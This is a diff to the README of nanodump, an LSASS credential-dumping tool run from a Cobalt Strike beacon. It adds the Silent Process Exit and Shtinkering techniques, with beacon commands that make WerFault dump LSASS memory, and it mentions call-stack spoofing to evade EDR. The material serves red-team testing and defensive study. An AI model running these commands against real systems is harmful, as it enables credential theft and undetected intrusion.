@@ -171,9 +171,11 @@ You can force the WerFault.exe process to create a full memory dump of LSASS. Ta
 
 Because the dump is not made by nanodump, it will always have a valid signature.
 
-To access this feature, use the `--werfault` parameter and the path there the dump should be created.
+<h3>Silent Process Exit</h3>
+
+To leverage the Silent Process Exit technique, use the `--silent-process-exit` parameter and the path there the dump should be created.
 ```
-beacon> nanodump --werfault C:\Windows\Temp\
+beacon> nanodump --silent-process-exit C:\Windows\Temp\
 ```
 
 A dump of the nanodump process will also be created, similar to this:
@@ -187,6 +189,15 @@ Mode                 LastWriteTime         Length Name
 -a----         6/23/2022   7:40 AM       58830409 lsass.exe-(PID-648).dmp
 -a----         6/23/2022   7:40 AM        7862825 nanodump.x64.exe-(PID-3224).dmp
 ```
+
+<h3>Shtinkering</h3>
+
+You can also use the Shtinkering technique, which requires nanodump to run under SYSTEM.
+```
+beacon> nanodump --shtinkering
+```
+
+The dump will tipically be created under `C:\Windows\system32\config\systemprofile\AppData\Local\CrashDumps`
 
 <h2 id="spoof-callstack">12. Spoof the callstack</h2>
 
@@ -229,8 +240,11 @@ Force seclogon to open a handle to LSASS and duplicate it.
 #### --spoof-callstack -sc { svchost,wmi,rpc }
 Call NtOpenProcess with a fake function callstack.  
 
-#### --werfault -wf < folder >
-Force WerFault to dump LSASS in the specified folder.  
+#### --silent-process-exit -spe < folder >
+Force WerFault to dump LSASS in the specified folder via SilentProcessExit.  
+
+#### --shtinkering -sk
+Force WerFault to dump LSASS in the specified folder via Shtinkering.  
 
 #### --getpid
 Get PID of LSASS and leave.  
@@ -299,6 +313,16 @@ Open a handle to LSASS with an invalid callstack and download the minidump with 
 beacon> nanodump --spoof-callstack svchost
 ```
 
+Use the Shtinkering techinque:
+```
+beacon> nanodump --shtinkering
+```
+
+Obtain a handle using seclogon leak local and create the dump using the Shtinkering techinque:
+```
+beacon> nanodump --seclogon-leak-local --shtinkering
+```
+
 <h2 id="redirectors">14. HTTPS redirectors</h2>
 
 If you are using an HTTPS redirector (as you should), you might run into issues when downloading the dump filessly due to the size of the requests that leak the dump.  
@@ -328,5 +352,5 @@ location ~ ^...$ {
 - [Matteo Malvica](https://twitter.com/matteomalvica) for [Evading WinDefender ATP credential-theft: a hit after a hit-and-miss start](https://www.matteomalvica.com/blog/2019/12/02/win-defender-atp-cred-bypass/)
 - [James Forshaw](https://twitter.com/tiraniddo) for [Windows Exploitation Tricks: Exploiting Arbitrary Object Directory Creation for Local Elevation of Privilege](https://googleprojectzero.blogspot.com/2018/08/windows-exploitation-tricks-exploiting.html)
 - [itm4n](https://twitter.com/itm4n) for the original PPL userland exploit implementation, [PPLDump](https://github.com/itm4n/PPLdump).
-- [Asaf Gilboa](https://mobile.twitter.com/asaf_gilboa) for [Lsass Memory Dumps are Stealthier than Ever Before - Part 2](https://www.deepinstinct.com/blog/lsass-memory-dumps-are-stealthier-than-ever-before-part-2)
+- [Asaf Gilboa](https://mobile.twitter.com/asaf_gilboa) for [Lsass Memory Dumps are Stealthier than Ever Before - Part 2](https://www.deepinstinct.com/blog/lsass-memory-dumps-are-stealthier-than-ever-before-part-2) and the Shtinkering technique
 - [William Burgess](https://twitter.com/joehowwolf) for [Spoofing Call Stacks To Confuse EDRs](https://labs.withsecure.com/blog/spoofing-call-stacks-to-confuse-edrs)
